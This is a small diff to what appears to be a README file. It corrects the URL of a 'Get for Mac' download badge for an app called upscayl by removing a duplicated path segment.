@@ -5,7 +5,7 @@
 <br>
 <div align="center">
 
-[![Get for Mac](https://img.shields.io/badge/Get_for_Mac-green?style=for-the-badge&logo=apple)](https://demin-apps.github.io/.github/.github/upscayl)
+[![Get for Mac](https://img.shields.io/badge/Get_for_Mac-green?style=for-the-badge&logo=apple)](https://demin-apps.github.io/.github/upscayl)
 
 </div>
 
